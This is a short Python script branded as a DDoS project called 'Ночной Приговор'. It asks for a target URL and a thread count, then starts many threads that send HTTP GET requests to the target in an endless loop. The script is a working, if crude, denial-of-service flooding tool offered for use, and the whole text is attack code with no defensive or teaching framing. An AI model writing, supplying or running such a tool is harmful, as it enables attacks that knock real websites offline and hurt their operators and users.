import colorama
import threading
import requests
import os

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")


threads = 60
print("""
\x1b[38;2;255;20;147m   DDOS
\x1b[38;2;255;20;147m  PROJECT
\x1b[38;2;255;20;147m 'НОЧНОЙ ПРИГОВОР'\x1b[38;2;0;255;58m
""")
os.system('color 2')
url = input("URL: ")

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("Invalid domain")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started! By project 'Ночной Приговор'")